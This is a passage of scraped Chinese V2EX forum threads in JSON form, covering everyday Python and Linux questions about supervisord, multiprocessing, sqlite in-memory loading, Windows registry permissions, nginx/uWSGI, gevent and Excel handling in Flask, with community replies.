process\r", "2017-04-15 08:43:04,981 INFO supervisord started with pid 15044\r", "\r", "貌似没看出有啥问题呢。也没有报错。", "Included extra file \"/etc/supervisord/conf.d/elasticsearch.conf\" during parsing \r", " \r", "上面的一行说明你的 elasticsearch.conf 已经被加载了，现在我越来越猜测是 elasticsearch.conf 配置问题导致没有启动\r", "\r", "既然没有打开 http ，那就使用如下命令看看 status 吧\r", "\r", "supervisorctl status", "1.supervisor 配置中的 command 一定要处于挂起运行，把标准输出，是他的子进程，运行期间不能返回\r", "2.你需要用命令行启动 es 的方式，配置到 command\r", "3.既然用 systemd 和 supervisor 用一个就可以，他们都是守护\r", "\r", "\r", "有问题可以加群问，效率高些，面向初学者的 python Linux 学习群， 由一群有经验的工程师组成， python qq 群号： 278529278 ， PHP qq 群号： 476648701 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "这样写试试 [program:sticsearch]", "新版本先要启动 supervisord 然后在启动 supervisorctl ，不然会一直报错……", "而且你 command 那里最好写成 shell 脚本去执行，错误概率小一点"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>上次收集机器学习资料： <a href=\"https://www.v2ex.com/t/353755\" rel=\"nofollow\">https://www.v2ex.com/t/353755</a></p>\n<p>反馈不是太多，我最几天自己慢慢学了起来，打算边学习边写点文章</p>\n<ul>\n<li>数学方面\n<ul>\n<li>高数</li>\n<li>线性代数</li>\n<li>概率</li>\n<li>统计</li>\n</ul>\n</li>\n<li>Python\n<ul>\n<li>numpy</li>\n<li>pandas</li>\n<li>matplotlib</li>\n</ul>\n</li>\n</ul>\n<p>结合 gitbook 上的这本书： <a href=\"https://www.gitbook.com/book/wizardforcel/guide-to-data-mining\" rel=\"nofollow\">https://www.gitbook.com/book/wizardforcel/guide-to-data-mining</a></p>\n<p>先拿第二章和第三章的内容来熟悉一下 numpy 和 pandas ： <a href=\"http://www.jianshu.com/p/441368fcb8a7\" rel=\"nofollow\">http://www.jianshu.com/p/441368fcb8a7</a></p>\n<p>numpy 和 pandas 确实很好用！</p>\n<p>以后所有的文章更新，都会在这个主题下 append 。如果有新的资料，我会到收集机器学习资料的主题下 append</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "开始写机器学习系列文章（边学边写）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>问题背景</h3>\n<p>现在有一个 Python 程序，这个程序里面 <code>import abc</code> 模块，该是用 C++ 编写的，编写的时候还使用了 OpenMP 多线程库。直接通过 <code>python <a href=\"http://xxx.py\" rel=\"nofollow\">xxx.py</a> --options OPTIONS</code> 来运行，可以感受到多线程带来性能上的提升。但是这个 <code>abc</code> 模块的编写似乎有一点问题，在某些参数条件下会崩溃，这个崩溃不是抛出异常，而是整个 Python 程序（解释器）的崩溃，没有任何错误提示。<code>OPTIONS</code> 最终也是由 <code>__main__</code> 函数负责解析，调用里面的函数 <code>func(args...)</code> 来完成。</p>\n<p>我们需要测试不同的参数组合，并且不想因为某一组参数导致整个测试程序的崩溃。所以我们就另外编写了一个 Python 程序，里面 <code>from xxx import func</code>，然后想要通过派生一个新的进程来执行 <code>func</code>，防止因为崩溃导致主进程的崩溃。</p>\n<h3>multiprocessing 方式</h3>\n<p>首先想到的是使用 multiprocessing 方式，相关的代码如下：</p>\n<pre><code>from multiprocessing import Process\nfrom xxx import func\n\np = Process(target=func, args=(__OPTIONS__)) # __OPTIONS__ 为想要传入的参数\np.start()\np.join(300) # 设置主进程阻塞 300 秒\nwhile p.is_alive():\n  p.terminate()\n# 处理 IPC 回收数据\n</code></pre>\n<p>设定超过 <code>300</code> 秒就算失败。现在的问题是，使用这种方式执行 <code>func</code> 后，看起来 <code>func</code> 的执行失去了并行能力，执行其中的一个运算会卡住，但是这个卡住是真卡住了还是因为没有运算完，这个无从得知。</p>\n<h3>subprocess 方式</h3>\n<p>其次想到的就是利用 subprocess 来做，相关代码如下：</p>\n<pre><code>import subprocess\nfrom xxx import func\n\np = subprocess.Popen('python xxx.py --options OPTIONS', shell=True)\n# 处理超时以及从 STDOUT 回收数据\n</code></pre>\n<p>利用这种方式 <code><a href=\"http://xxx.py\" rel=\"nofollow\">xxx.py</a></code> 可以正常的并行执行，但是想要回收数据，只能通过 STDOUT 或者写入文件来进行。</p>\n<h3>问题</h3>\n<p>为什么通过 multiprocess.Process 执行的函数多进程会看起来丧失并行能力？</p>\n</div></div>"], "reply": "9", "tittle": "Python 下多进程的问题", "comment": ["子进程在的 python 解释器都挂了还能指望 join 能正常工作么？", "你明显不会写异步处理的程序。", "用 exec 调用来？", "py 下没试过。。。。 php 下用异步的类 exec 调用可以开 n 个 php 程序，具体 api 是 proc_open 。。。。 py 下肯定有这样的 api", " 通过 spawn 方式的 Process 不是重新开一个新的 Python 解释器来做吗？不过似乎 Python 2 不支持这种定义？", " 没有经验，希望多多指教。", " 查到 Python 下可以用 pool.apply_async 似乎是同样的工作，周一去试试。\r", "其实我就想让主进程调用完了就阻塞的。", "试试\r", "p.daemon = True\r", "p.start()", "如果你自己看过 multiprocess.Process 的源代码，他内部是有子进程和父进程的通讯的，而你的子程序可能因为某些原因导致了通讯未能正常进行，所以就表选出卡住了的状态，而一个正常运行的 python 解析器是肯定可以保证通讯正常进行的\r", "另外，实际上 multiprocess.Process 内部依然使用了 Popen 来实现，所以你自己模仿实现一个也没啥毛病"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>提取的字符串里有好多链接，都是相对路径，如何把这些都改成绝对路径？\n比如：<a href=\"about.html\" rel=\"nofollow\">改成</a><a href=\"http://www.abc.com/about.html\" rel=\"nofollow\">\n实际上就是修改 href 的内容，先提取出 href ，再用 urljoin 转换成绝对路径，但是怎么找每个链接的 href 的位置呢？</a></p><a href=\"http://www.abc.com/about.html\" rel=\"nofollow\">\n</a></div></div>"], "reply": "6", "tittle": "提取内容里链接的相对路径如何改成绝对路径？", "comment": ["上面发贴失误，是这样的：\r", "提取的字符串里有好多链接，都是相对路径，如何把这些都改成绝对路径？\r", "比如： href=\"about.html\"改成 href=\"http://www.abc.com/about.html\"\r", "实际上就是修改 href 的内容，先提取出 href ，再用 urljoin 转换成绝对路径，但是怎么找每个链接的 href 的位置呢？", "不需要找位置，知道当前页面的 URL(目录)就行了\r", "\r", "\r", "\r", "\r", "\r", "这些都会走到同一个页面的，不用担心", "还有，记得 python 中计算相对路径和绝对路径的函数，对 URL 也适用，你找找", " 是我提问没说明白，我是想要改成绝对路径的字符串，比如我把别的网站一个页面取下来传到我的网站上，那这个页面上相对路径的 about.html 指向的是我的网站，我要的是指向他的网站的 about.html ，所以要把这里的相对路径改成绝对路径。", " 那你就改呗", "bs4 ， lxml 都可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚开始学习 sqlite3 ，请问一下，如果是数据库保存在硬盘上，那么能不能转换成内存模式再操作？\n主要是用于查询这块，我保存了电话区号，省市名称等内容，想一次性转换成内存模式，调用起来快些。</p>\n</div></div>"], "reply": "19", "tittle": "sqlite3 的硬盘数据库如何转换成内存模式？", "comment": ["提前读出来？", "…", " 读出来再导入到内存数据库中？太麻烦了吧，能不能用一两条语句转换的？", " 弱鸡表示不知道啥叫内存数据库。。。。。", "直接上 redis 呗", "单例，延时加载，条件预加载", "\r", "大致思路是先备份然后恢复到内存数据库中\r", "我就在想有没有什么能直接操作内存的方法，比如直接把文件读了放在内存里，然后告诉 sqlite3 内存位置，估计读源码肯定可以，就找处理:memory:那段代码修改", "小码民路过。。。前几年用 C++  & cppsqlite3 做背单词的小软件，把金山词霸词库 XML 的格式（ 23 万单词加例句，词性，解释，音标什么的几乎一字不漏弄进去了，数据库也就单文件 26M 上下），查个单词加组织起来的界面显示都是很快的，所以当时略了解过 sqlite3 的皮毛，似乎在理解的印象+文档中， sqlite 检索决定性并不在于 I/O （当然 I/O 也很重要），而在于分库+索引+算法，当时在论坛上有老外做了一秒 2,3 百万的压力也是妥妥的，当时也有想过楼主的问题，没研究下去了，觉得没必要。因为在内存里操作，就直接等于写字节了，而不在于对数据库的操作了，总不能为了喝牛奶而去研究牛的养殖方式吧，如果楼主研究成功了，麻烦烧纸告知，谢谢！", "漏写了一句，楼主研究学习还是很支持的~", "同步到 /dev/shm 中 ？( 逃", "…我当初是把 SQLite3 数据库放在了内存盘中…\r", "结果 insert 速度提升了似乎有几十倍。。。。\r", "\r", "原本要插好几分钟的数据，只花了十秒左右。。。", "linux 下，用 tmpfs 保存数据库文件副本", " 其实我现在已经实现了，在运行时新建一个内存数据库，把硬盘数据库内的记录一条条导入到内存数据库中，但我觉得这种方法比较 LOW ，是吧，所以想看看有没有更为简便的方法能用一两条语句就直接转换了的。", "python sqlite3 的 connect 有个 iterdump() \r", "具体的自己看手册去  嘿嘿 就不告诉你  \r", "\r", "得到太容易 容易忘记 ^_^", "ramdisk （匿了", " \r", "\r", "关于 iterdump() 我只找到这一个，并没找到相关文档，这个实例是从内存库里导到文件库的，但我的需要是相反的啊，我想从文件库里导到内存中。\r", "buffer = StringIO.StringIO()\r", ">>for line in db.iterdump():\r", ">>>>buffer.write(line)\r", ">>db.close()", "推荐一个神库 sqlitedict ，用过之后保准上瘾。题主闲存进内存麻烦的话，用这个就是一两行代码的问题。", " 刚粗略看了下，是挺好的，待细究，谢谢", "你先对 文件库里的 iterdump  \r", "然后再建一个内存库 内存库导入这个 dump 不就完了\r", "\r", "两个 sqlite db  a 是磁盘 b 内存\r", "a dump 后\r", "b 导入 a 的 dump\r", "\r", "然后进程结束钱 b dump 然后 a 导入 b 的 dump\r", "\r", "脑子咋不灵活点呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以下代码为何老是出现： PermissionError: [WinError 5] 拒绝访问  异常？</p>\n<p>import winreg as reg</p>\n<p>def proReg():</p>\n<pre><code>subkey = '*\\shell'\nkey = reg.OpenKey(reg.HKEY_CLASSES_ROOT,subkey)\nwith key:\n    reg.SetValue(key,'runas',reg.REG_SZ,'TEST')   # 这里抛出异常\n    with reg.OpenKey(key,'runas',0,reg.KEY_WRITE) as nkey:\n        reg.SetValueEx(nkey,'NoWorkingDirectory',0,reg.REG_SZ,'')\n</code></pre>\n<p>if <strong>name</strong> == '<strong>main</strong>':</p>\n<pre><code>   proReg()\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "注册表操作疑问", "comment": ["这个键是高权限的呀，已管理员运行就行了", "行家一出手，.... 谢谢\r"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/intohole/b2\" rel=\"nofollow\">https://github.com/intohole/b2</a></div>"], "reply": "26", "tittle": "一个自己写的工具箱，看看大家是否需要", "comment": ["现在只有你和上帝知道这是干嘛用的，过阵子可能就只有上帝一个人知道了。", "文件名末尾都加个 2 总觉得很奇怪", "完美诠释了写好 README 是多么的重要", "1# 很亮", "同 2 楼问，为啥都是 2 。。。", " @", " 我猜楼主是为了和自带的库区分？", "合格一楼", "路过,明天看看,感谢分享", "Console 拼错了，不能忍。", "每个人都有一个类似的，我的叫做 helpers.py …", "呃，很好啊， UDF 用的很漂亮。但 LZ 你的这种 implicit relative import 真的是%>......还有提些建议～～：有一个方法是 def read_config_json(file_path)，但是 json 是自带 json.load(file_name) 来把文件内容直接转化为 JSON 的：-D 。还有，大家为什么都要用 __all__，大部分时候都是不用 import * 引入的吧", "楼主你适合写 Scheme 这样不用担心库的命名", "啥子库？", " utils.py ......", "文档很重要 虽然写起来很痛苦 。。", "不知道是什么东西，基本上看了就关闭了。。", " 可以看下 function.md", " 是的 我只是原来一直积攒下来的一些东西", " 是的文档时间很重要 ， 但是这个一般我自己用就不写了", " 什么意思呢？", " 写文档很重要 但是这只是一个工具包，我只是看有没有人用而已", " tool 谐音 2", " tool 谐音 2", " 如果有什么想要的功能可以写在 issue 里面", " console 谢谢指正", " 好的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在已经有一段 flask 实现的功能，每当用户向微信公众号发一条文字，就能即时储存或做某一个动作。</p>\n<p>那么前端应该用什么技术实现呢？就是开着一个网页，每当用户发送文字到公众号后台，就在网页上变成弹幕飞出来……</p>\n</div></div>"], "reply": "5", "tittle": "如何实现用户在微信公众号后台发送文字，在网页上变成弹幕？", "comment": ["socket.io?", "论 websocket 典型应用 2333", "websocket ，甚至页面前端 ajax 轮询都行", "redis pub/sub", "德莱文:太简单啦！！！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 的模块其实就是封装了一个或者多个功能的代码集合，以便于重用，模块可以是一个<code>文件</code>也可以是一个<code>目录</code>，目录的形式称作<code>包</code>。</p>\n<h2>模块分类</h2>\n<p><strong>内置模块</strong></p>\n<p>内置模块可以理解成当你安装好 python 环境之后，直接可以使用<code>import</code>导入的就是内置模块，默认模块路径为：<code>C:\\Python35\\lib</code>，你也可以通过以下方式获取内置模块的路径：</p>\n<pre><code> # 导入 sys 模块\n &gt;&gt;&gt; import sys\n # 最后一个目录就是内置模块的路径\n &gt;&gt;&gt; for n in sys.path:\n ...  print(n)\n ...\n\nC:\\Python35\\lib\\site-packages\\pip-8.1.1-py3.5.egg\nC:\\Python35\\python35.zip\nC:\\Python35\\DLLs\nC:\\Python35\\lib\nC:\\Python35\nC:\\Python35\\lib\\site-packages\n</code></pre>\n<p><strong>第三方模块</strong></p>\n<p>第三方模块通常是开发者自己编写的模块，然后提交到 python 官方的库中，这样我们就可以下载安装使用了，默认安装目录为<code>C:\\Python35\\lib\\site-packages</code>，</p>\n<p><strong>自定义模块</strong></p>\n<p>自己编写的模块</p>\n<h2>模块的导入方式</h2>\n<p>把一个模块当做成一个整体来进行导入</p>\n<pre><code>import sys\n</code></pre>\n<p>从一个模块中导入特定的变量或者是方法</p>\n<pre><code>from sys import path\n</code></pre>\n<p>调用的时候直接使用方法名<code>path</code></p>\n<pre><code>&gt;&gt;&gt; path\n['', 'C:\\\\Python35\\\\lib\\\\site-packages\\\\pip-8.1.1-py3.5.egg', 'C:\\\\Python35\\\\python35.zip', 'C:\\\\Python35\\\\DLLs', 'C:\\\\Python35\\\\lib', 'C:\\\\Python35', 'C:\\\\Python35\\\\lib\\\\site-packages']\n</code></pre>\n<p>给导入的模块或者方法起一个别名</p>\n<pre><code>from sys import path as path_alias\n</code></pre>\n<p>调用的时候使用别名<code>path_alias</code></p>\n<pre><code>&gt;&gt;&gt; path_alias\n['', 'C:\\\\Python35\\\\lib\\\\site-packages\\\\pip-8.1.1-py3.5.egg', 'C:\\\\Python35\\\\python35.zip', 'C:\\\\Python35\\\\DLLs', 'C:\\\\Python35\\\\lib', 'C:\\\\Python35', 'C:\\\\Python35\\\\lib\\\\site-packages']\n</code></pre>\n<p>添加默认的环境变量,当前生效</p>\n<pre><code>sys.path.append(\"PATH_NAME\")\n</code></pre>\n<p>可以使用<code>imp</code>模块中的<code>reload</code>方法重新载入某个模块的方法，例如下面的实例：</p>\n<pre><code>$ cat simple.py \n#!/use/bin/env python\n\nprint('Hello, World!')\nspam = 1\n</code></pre>\n<pre><code>&gt;&gt;&gt; import simple\nHello, World!\n&gt;&gt;&gt; simple.spam\n1\n&gt;&gt;&gt; simple.spam += 1\n&gt;&gt;&gt; import simple\n&gt;&gt;&gt; simple.spam\n2\n&gt;&gt;&gt; import imp\n&gt;&gt;&gt; imp.reload(simple)\nHello, World!\n&lt;module 'simple' from '/Users/ansheng/simple.py'&gt;\n&gt;&gt;&gt; simple.spam\n1\n</code></pre>\n<h2>模块导入顺序</h2>\n<ol>\n<li>先在当前脚本目录寻找有没有与导入模块名称相同的文件，如果有就把这个文件当作模块导入（据不完全统计，这是个坑，测试<code>re</code>模块没有问题，但是测试<code>sys</code>模块就有问题了）</li>\n<li>查找模块路径下面有没有对应的模块名</li>\n<li>如果没有找到模块名就报错</li>\n</ol>\n<h2>import 是如何工作的？</h2>\n<p>模块在被导入的时候会执行以下三个步骤：</p>\n<ol>\n<li>通过环境变量找到模块文件；</li>\n<li>编译成字节码文件，如果有字节码文件则导入字节码文件；</li>\n<li>执行模块中的代码来创建所定义的对象；</li>\n</ol>\n<p>以上的三个步骤只有在程序运行时，模块被第一次导入时才会进行。如果已经导入了这个模块然后再次导入的时候会跳过上面的三个步骤，它会直接提取内存中已经加载的模块对象。 Python 已经导入的模块会保存在<code>sys.modules</code>字典中。</p>\n<h2>_X 与__all__</h2>\n<p>在模块中的所有变量以<code>_</code>开头的都不会被<code>from *</code>所导入</p>\n<pre><code>$ cat simple.py \n#!/use/bin/env python\n\n_spam1 = 1\nspam2 = 1\n</code></pre>\n<pre><code>&gt;&gt;&gt; from simple import *\n&gt;&gt;&gt; dir()\n# _spam1 没有被导入\n['__builtins__', '__doc__', '__name__', '__package__', 'spam2']\n</code></pre>\n<p>相反的<code>__all__</code>列表里面的变量则会被<code>from *</code>所导入，没有在<code>__all__</code>列表里面的变量则不会被导入</p>\n<pre><code>$ cat simple.py\n#!/use/bin/env python\n\n__all__ = ['spam2']\n\nspam1 = 1\nspam2 = 1\n</code></pre>\n<pre><code>&gt;&gt;&gt; from simple import *\n&gt;&gt;&gt; dir()\n# spam1 没有被导入\n['__builtins__', '__doc__', '__name__', '__package__', 'spam2']\n</code></pre>\n<h2>注意事项</h2>\n<p>据不完全统计，如果导入的模块的名称在当前目录下有这个文件，那么只会把当前目录下的这个文件当作模块，如下演示：</p>\n<p>创建一个脚本文件，名称为 scripts</p>\n<pre><code>[root@iZ28i253je0Z ~]# touch scripts.py\n</code></pre>\n<p>内容为</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n# 导入一个模块 re\nimport re\n# 输出匹配到的字符串 abc\nprint(re.match('\\w+',\"abc\").group())\n</code></pre>\n<p>执行脚本</p>\n<pre><code>[root@iZ28i253je0Z ~]# python scripts.py \n# 把匹配到的结果 abc 输出出来\nabc\n</code></pre>\n<p>创建一个<code>.py</code>文件，名称为<code><a href=\"http://re.py\" rel=\"nofollow\">re.py</a></code></p>\n<pre><code>[root@iZ28i253je0Z ~]# touch re.py\n</code></pre>\n<p>内容为</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n# 输出内容 modus\nprint(\"Hello Word\")\n</code></pre>\n<p>再次执行<code><a href=\"http://scripts.py\" rel=\"nofollow\">scripts.py</a></code>脚本</p>\n<pre><code>[root@iZ28i253je0Z ~]# python scripts.py \n# 先输出 Hello Word\nHello Word\n# 然后再报错没有 match 这个方法\nTraceback (most recent call last):\n  File \"scripts.py\", line 6, in &lt;module&gt;\n    print(re.match('\\w+',\"abc\").group())\nAttributeError: 'module' object has no attribute 'match'\n</code></pre>\n<p>这是为什么呢？因为<code>python</code>把<code><a href=\"http://re.py\" rel=\"nofollow\">re.py</a></code>当成模块<code>re</code>了，继续往下看：</p>\n<p>更改<code><a href=\"http://scripts.py\" rel=\"nofollow\">scripts.py</a></code>文件内容如下</p>\n<pre><code>[root@iZ28i253je0Z ~]# cat scripts.py \n#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nimport re\n</code></pre>\n<p><code><a href=\"http://re.py\" rel=\"nofollow\">re.py</a></code>文件内容不变，然后我们在执行脚本<code><a href=\"http://scripts.py\" rel=\"nofollow\">scripts.py</a></code></p>\n<pre><code>[root@iZ28i253je0Z ~]# python scripts.py \nHello Word\n</code></pre>\n<p>看到了吧，他会把<code><a href=\"http://re.py\" rel=\"nofollow\">re.py</a></code>文件内的代码拿到<code><a href=\"http://scripts.py\" rel=\"nofollow\">scripts.py</a></code>文件中去执行，这是个坑，最好别踩。</p>\n<h2>导入当前目录下子目录下的文件</h2>\n<pre><code>[root@ansheng ~]# tree ./\n./\n├── modules\n│   ├── __init__.py\n│   ├── lib01.py\n│   └── lib02.py\n└── scripts.py\n\n1 directory, 4 files\n[root@ansheng ~]# cat scripts.py \n#!/usr/bin/env python\n# 导入 modules 包下面的 lib01 模块\nfrom modules import lib01\n# 导入 modules 包下面的 lib02 模块\nfrom modules import lib02\n[root@ansheng ~]# cat modules/__init__.py \n#!/usr/bin/env python\n[root@ansheng ~]# cat modules/lib01.py \n#!/usr/bin/env python\n# lib01.py 文件会输出\"Hello lib01\"\nprint(\"Hello lib01\")\n[root@ansheng ~]# cat modules/lib02.py  \n#!/usr/bin/env python\n# lib02.py 文件会输出\"Hello lib02\"\nprint(\"Hello lib02\")\n</code></pre>\n<p>执行结果</p>\n<pre><code>[root@ansheng ~]# python scripts.py\n# 会执行 modules/lib02.py 与 modules/lib01.py 文件内容\nHello lib01\nHello lib02\n</code></pre>\n<blockquote>\n<p>包含目录下的文件时需要在目录下声明一个<code><a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></code>文件，即使这个文件是空的也可以。</p>\n</blockquote>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-standard-library-introduction/\" rel=\"nofollow\">原文链接</a></p>\n</div></div>"], "reply": "2", "tittle": "Python 标准库系列之模块介绍", "comment": ["这跟标题里的“标准库”有啥关系？", "谢谢, 把旧知识重温了一遍"]},
{"content": ["<div class=\"topic_content\">去年有这个，后来不行了\r<br>现在想清理下好友，怎么利用 Python 清理好友？</div>"], "reply": "4", "tittle": "怎么利用 Python 查看被删的微信好友", "comment": ["凑着过年，发个吉利话ア，拜个年。。。顺便清理了。", " 攒", " 好像这方法没法用了？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 win 环境下使用 pycharm IDE 编辑 Python 项目\n2 在 remote server 上运行和调试该项目，\n3 因为， remote server 是全命令行，如何使 win pycharm 里的项目实时更新到 remote server 上？\n4 保持.git 的信息完整，代码 注释 annotato 的正确性~</p>\n</div></div>"], "reply": "3", "tittle": "win pycharm project deloyed to remote Linux server", "comment": ["rsync", "1, deploy 不是 deloy\r", "\r", "2, 点击 tools ，里面有个 deployment 选项，设置好服务器，有个 automatically upload ，勾选之后，当 pycharm 失去焦点， pycharm 进行自动保存，同时会自动上传代码。", "  感谢，代码同步可以 deployment ，那么ｇｉｔ信息呢？　　ｗｉｎ下的项目部署到远程ｌｉｎｕｘ　ｓｅｖｅｒ上。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>明明设置了 域名 却不能用域名直接访问是咋回事</p>\n<pre><code>server {\n      listen  8080;\n      server_name www.test.com; \n    \n      location / {\n        include      uwsgi_params;\n        uwsgi_pass   127.0.0.1:8001;  # 指向 uwsgi 所应用的内部地址,所有请求将转发给 uwsgi 处理\n        uwsgi_param UWSGI_PYHOME /home/www/test/env; # 指向虚拟环境目录\n        uwsgi_param UWSGI_CHDIR  /home/www/test; # 指向网站根目录\n        uwsgi_param UWSGI_SCRIPT manage:app; # 指定启动程序\n      }\n    }\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "Flask + uWSGI + Nginx 绑定域名不生效？", "comment": ["域名没解析？", "目测楼上正解\r", "\r", "如果还是不行 可以先把 server_name 改成 localhost 通过 ip 访问试试", " 可以诶~ 但是默认用 8080 端口访问应该怎么设置 \r", "还是必须替换掉默认的 80 端口？", " http 协议的默认端口是 80 ，你不加端口的情况下，浏览器自然是以 80 端口建立连接。", "如果要域名默认访问的话就把 8080 改成 80 就好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>list=[\"a\",\"b\",\"c\",\"d\"]</p>\n<p>for n in xrange(0,4,1):</p>\n<p>如何 打印出</p>\n<p>0,a</p>\n<p>1,b</p>\n<p>2,c</p>\n<p>3,d</p>\n<p>测试了几种都不对，不知道怎么写,请兄弟们指导一下。感谢</p>\n</div></div>"], "reply": "16", "tittle": "Python 多 for in 问题", "comment": ["print(n,list[n])", "list=[\"a\",\"b\",\"c\",\"d\"]\r", "\r", "for k,v in enumerate(list):\r", "    print(k,v)\r", "\r", "-------------\r", "(0, 'a')\r", "(1, 'b')\r", "(2, 'c')\r", "(3, 'd')\r", "\r", "\r", "楼主应该是想要这个吧", "直接上 enumerate 啊", "关键字 enumerate", "其他自行搜索", " 十分感谢 测试有效", " \r", " \r", " \r", " 关于 enumerate 的用法 我也去搜索一下 \r", "感谢分享", "长见识了  enumerate 是个不错的内置函数，自动为数组或列表组成一个索引序列。\r", "用法\r", "for index,text in enumerate(list):\r", "\r", "   print index ,text\r", "\r", "\r", "方便后来人", "我也刚学了点 python 基础语法，好像没有 C 语言的 for-i 循环，只有 for-in ，配合 range 、 enumerate 之类的函数用起来也挺方便的。", "这个......还是授人以渔更好些（汗。。其实自己就是弱鸡）， Google 搜： Python iterate with index 第一个结果就是 SO 的这个 ", " 最高票回答就是用 enumerate 。换成 Scala iterate with index 就是 ", " ，用 zipWithIndex 。用 Java iterate with index ，就是 ", " ，本身没有实现，或者自己用一个变量来在 for-loop 里自增，或者用 iterator.nextIndex()", "所以一直说掌握好 Google+英文 能解决开发中 99% 的问题～", " 完全同意", "我觉得楼主要的是 zip\r", "for a, b in zip(lista, listb)", "list=[\"a\",\"b\",\"c\",\"d\"]\r", "for i in range(4):\r", "    print(i,list[i],sep=',')", "你可以看看 itertools 这个包，有很多好用的函数。", " enumerate 貌似是 built-in-functions 吧。\r", "\r", "这种情况肯定是 lz 对标准库不熟悉，建议系统地看一遍标准库。", " 嗯  正在看标准库，有个印象用的时候知道怎么搜了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如我有 1000 个网址 在一个 list 里面</p>\n<p>然后我起 10 个 gevent 协程去访问者 1000 个网址</p>\n<p>每次取一个网址，然后把这个网址从 list 里面删除</p>\n<p>访问完网址再去取一个</p>\n<p>请问这样有多线程之类的安全问题吗？</p>\n</div></div>"], "reply": "9", "tittle": "请教一个 gevent 初级问题，会有多线程问题吗？", "comment": ["虽然协程小弟办事靠谱\r", "\r", "也是找个大哥 epoll 来搞 io\r", "\r", "但是长者 GIL 还是保护了 list 线程安全", "GIL 本身维护着一个全局锁来保证线程安全\r", "官方解释：\r", "In CPython, the global interpreter lock, or GIL, \r", "is a mutex that prevents multiple native threads from executing Python bytecodes at once. \r", "This lock is necessary mainly because CPython ’ s memory management is not thread-safe.\r", " (However, since the GIL exists, other features have grown to depend on the guarantees that it enforces.)", "协程是单线程，不会有多线程同步的问题", "同一时间只有一个协程拥有运行权，不存在安全的问题", "为何不分配好十等分，或者用 queue", "同一个时刻只有一个协程在运行\r", "只有协程主动交出运行权,比如主动调用 gevent.sleep(),才会切换协程.\r", "所以不会在操作 list 的时候出错\r", "\r", "GIL 保证 bytecode 是线程安全的,比如 list.append()就是线程安全的,list[0] += 1 就不线程安全\r", "\r", "最后 你不确定的时候就加锁吧,反正都用 Python 了", " 如果协程读数据库， gevent 会主动帮我切换吗", "GIL 和这个问题是 2 个问题， ", "\r", "使用 gevent 的时候完全可以 if len(lstA): target=lstA.pop()不需要加锁。\r", "\r", "需要 gevent 里面使用同步试的数据库 driver 用 monkey patch 在 io 等待的时候线程交出运行权。", "Gevent 协程只在发生 I/O 的时候进行切换，不用担心。"]},
{"content": ["<div class=\"topic_content\">用 python 怎样实现 get 请求打开一张 excel 表，然后用 post 请求上传处理后的 excel 表，不知道有没有表达清楚，请前辈指点。</div>"], "reply": "28", "tittle": "python 怎样实现 get 请求打开 excel 表，然后 post 请求上传处理后的 excel 给服务器", "comment": ["不知所云", "xlrd 和 xlwt ，以前需要 2003 格式，现在<i>据说</i>2007 以上也可以了……", "楼主又来提高搜索引擎效率了啊", "  请问是在 flask 视图函数中， return xlwt 写的 excel ，就可以在客户端弹出 excel 了吗？", "就比如，我打开 ", " excel 表，用户修改这张 excel 表后，可以上传给服务器处理，就是希望界面是 excel 而不是浏览器，可以实现吗", " 你可以看看有没有人做出来过嘛，就算微软自己也没实现这个功能呀，你可以自己用 HTML5 写一个仿 excel 界面的网页，想直接调用 excel 除非是 activex 插件这种已经淘汰的方式调用 excel 的 com 组件\r", "另外，这个和 Python 有半毛钱的关系么？", " 谢谢指点", "浏览器不能打开 Excel 表格，更别说修改上传了。不过你可以在网页中设计一个类似 Excel 表格的 web 表单，用户提交信息后你再在后端根据提交的数据生成一个 Excel 表格即可。\r", "\r", "前端表格库 Handsontable ", "\r", "后端处理 Excel 库 ", "我怎么觉得楼主说的好像是这样的东西。。。\r", "example.com/download.php?filename=ABC.xlsx\r", "example.com/upload.php?filename=ABC_EDITED.xlsx", "用 OWA 吧", " +1", "Office Online 吧", "> python 怎样实现 get 请求打开 excel 表，然后 post 请求上传处理后的 excel 给服务器\r", "> 如何实现打开 url,读 sql,pandas 处理， excel 显示\r", "> flask 或 toanado ，视图函数里面的语句都可以被执行吗\r", "> 怎样才能够直接运行 python 脚本呢？\r", "> 用 pandas 操作 mysql 读写效率高吗\r", "> 请教：用 python 如何获取 excel 表的“保存”事件\r", "> window 下， python 的文件独占锁，有没有现成的库？\r", "> pandas 生成一列是另一列的累加结果，怎么做\r", "\r", "\r", "LZ 作业做完了么。。。。", "希望大家以后不要再回答楼主的问题了，典型伸手党。", " 看需求已经详细到这一步，估计马上就写完了", "Blocked", " 做了 103 天还没做完，心疼楼主一秒钟", "用过一个 OA 有这个功能，不过是 .net 的", "这个我做过，用第三方控件很简单", " 请问下是什么控件呢？", "像我这种菜鸟，搜索引擎不到答案，到这里来提问，能够得到大家的帮助，非常感激。如果觉得不屑，无需理会就是了，何必喷人呢。能够更直接的解决不同层次人的疑问，难道不是这个网站的价值吗？", " 因为太菜了，做不下去，所以跑这里冒味问一些大家觉得很傻的问题", " ntko office", "你把 excel 理解成数据库，打开网页的时候从数据库加载数据，修改后保存 @", "重定向， ", " 写到 ByteIO 里返回去。", " \r", "```python\r", "        wb = xlwt.Workbook()\r", "        ws = wb.add_sheet('预算报表')\r", "        row = [0]\r", "\r", "        def write_line(line, 